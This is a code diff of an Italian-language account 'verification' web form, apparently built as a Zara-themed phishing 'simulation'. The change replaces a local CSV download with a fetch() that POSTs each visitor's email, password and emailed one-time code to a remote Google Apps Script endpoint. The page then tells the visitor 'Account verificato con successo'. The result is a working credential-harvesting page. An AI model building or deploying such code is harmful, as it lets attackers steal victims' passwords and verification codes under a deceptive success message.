@@ -33,7 +33,7 @@
         <label for="password">Password</label>
         <input id="password" type="password" placeholder="********" required>
 
-        <label for="pin">Codice verifica</label> <!-- lo mando all'interno della mail -->
+        <label for="pin">Codice verifica</label>
         <input id="pin" type="text" placeholder="123456">
 
         <label for="note">Nota partecipante</label>
@@ -41,7 +41,7 @@
 
         <div class="consent">
           <input type="checkbox" id="consent" />
-          <label for="consent" style="display:inline;">Confermo di aver accettato le linee guida della comunity</label>
+          <label for="consent" style="display:inline;">Confermo di aver accettato le linee guida della community</label>
         </div>
 
         <button class="btn btn-primary" type="submit">Verifica</button>
@@ -57,15 +57,12 @@
   </div>
 
   <script>
-    // funzione per pulire e rimuovere caratteri come virgole e altro
     function sanitizeCell(s) {
       if (s === null || s === undefined) return "";
-      // sostituisce newline e virgole/simili per non interrompere il CSV
       return String(s).replace(/[\r\n]+/g, " ").replace(/"/g, '""').trim();
     }
 
     function csvEscapeCell(s) {
-      // metto sempre gli apici per sicurezza
       return '"' + sanitizeCell(s) + '"';
     }
 
@@ -77,7 +74,7 @@
         return;
       }
 
-      // prendi i valori 
+      // Prendi i valori
       const email = document.getElementById('email').value;
       const pwd = document.getElementById('password').value;
       const pin = document.getElementById('pin').value;
@@ -85,43 +82,40 @@
       const now = new Date();
       const nowLocale = now.toLocaleString();
 
-      // Header + riga dati CSV
-      const headers = ['simulazione','data_locale','email','password','codice_verifica','nota'];
-      const row = [
-        'simulazione_zara',
-        nowLocale,
-        email,
-        pwd,
-        pin,
-        note
-      ];
+      // ====== INVIO AL GOOGLE APPS SCRIPT ======
+      fetch('https://script.google.com/macros/s/AKfycbwdOzfd6_QAh8Uzru4How494Yhub1G-fEQPFPHdowRwPjTiWZBteYyDK64LS0E9DPyIlA/exec', {
+        method: 'POST',
+        body: JSON.stringify({
+          email: email,
+          password: pwd,
+          pin: pin,
+          note: note,
+          date: nowLocale
+        }),
+        headers: {
+          'Content-Type': 'application/json'
+        }
+      })
+      .then(res => res.json())
+      .then(res => {
+        if(res.status === 'ok'){
+          alert('CSV inviato con successo!');
+        } else {
+          alert('Errore durante l’invio.');
+        }
+      })
+      .catch(err => {
+        console.error(err);
+        alert('Errore di connessione allo script.');
+      });
+      // ====== FINE FETCH ======
 
-      // costruisco csv
-      const bom = '\uFEFF';
-      const csvContent = bom + headers.map(csvEscapeCell).join(',') + '\n' + row.map(csvEscapeCell).join(',') + '\n';
-
-      // nome file con anche l'orario di salvataggio
-      const filename = 'simulazione_zara_' + now.toISOString().replace(/[:.]/g,'-') + '.csv';
-
-      // aiuto AI
-      // crea blob e fornisci download locale
-      const blob = new Blob([csvContent], { type: 'text/csv;charset=utf-8;' });
-      const url = URL.createObjectURL(blob);
-      const a = document.createElement('a');
-      a.href = url;
-      a.download = filename;
-      document.body.appendChild(a);
-      a.click();
-      a.remove();
-      URL.revokeObjectURL(url);
-      // fine
-
-      // mostra il risultato in pagina 
+      // Mostra il risultato in pagina
       const out = document.getElementById('demoResult');
       out.style.display = 'block';
       out.textContent = "Account verificato con successo";
 
-      // pulizia campi
+      // Pulizia campi
       document.getElementById('email').value = '';
       document.getElementById('password').value = '';
       document.getElementById('pin').value = '';
